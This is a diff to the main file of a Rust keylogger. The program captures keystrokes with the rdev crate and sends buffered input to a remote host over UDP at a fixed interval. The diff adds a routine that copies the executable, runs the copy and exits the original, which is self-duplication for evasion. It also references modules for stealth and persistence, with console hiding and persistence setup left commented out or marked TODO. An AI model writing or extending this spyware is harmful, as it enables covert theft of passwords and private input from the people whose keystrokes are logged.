@@ -1,32 +1,41 @@
 use core::time;
-use std::thread;
 use rdev::Key;
+use std::env;
 use std::net::UdpSocket;
+use std::process;
 use std::sync::{Arc, Mutex};
+use std::thread;
+
+use crate::constants::SEND_INTERVAL_SECS;
 
 mod capture;
-mod stealth;
-mod persistence;
 mod client;
+mod constants;
+mod duplication;
+mod execution;
+mod persistence;
+mod stealth;
+mod utils;
 
-const SEND_INTERVAL_SECS: u64 = 5;
+fn initialize_application() {
+    let args: Vec<String> = env::args().collect();
+    let current_executable_path = env::current_exe().unwrap();
+    let is_duplicate_running = args.len() == 2;
+
+    if !is_duplicate_running {
+        if let Ok((old_exe_path, new_exe_path)) = duplication::try_duplicate_itself() {
+            // let _ = remove_existing_persistence();
+            // let _ = setup_persistence();
+            execution::execute_new_instance(&new_exe_path, &old_exe_path);
+            process::exit(0);
+        }
+    }
+
+    // TODO: hide_console_window();
+}
 
 fn main() {
-    println!("Keylogger");
-
-    // let args: Vec<String> = env::args().collect();
-    // let is_spoofed = args.len() == 2 && args[1] == "spoofed";
-
-    // if !is_spoofed {
-    //     if let Ok(path) = duplicate_itself() {
-    //         clean_old_persistence();
-    //         add_persistence();
-    //
-    //         println!("Running the spoofed executable");
-    //         run_program(&path);
-    //     }
-    //     return; // Exit whatever happens
-    // }
+    // TODO: initialize_application();
 
     let socket: UdpSocket = match client::create_socket() {
         Ok(socket) => socket,
@@ -54,20 +63,4 @@ fn main() {
     });
 
     capture::listen_to_events(buffer_clone_for_populating);
-
-    // TODO: hide_console_window();
-    
-    // TODO: get old executable path from args
-    // TODO: remove old executable                => program change name at each run (= each reboot)
-
-    // TODO: (in other thread) Each 30s try to connect to server
-    // TODO:   if connected:
-    // TODO:     set output to socket
-    // TODO:     if log file is not empty, send it
-    // TODO:   else:
-    // TODO:     set output to file
-
-    // TODO: capture the key strokes (rdev ?)
-
-    loop {}
 }
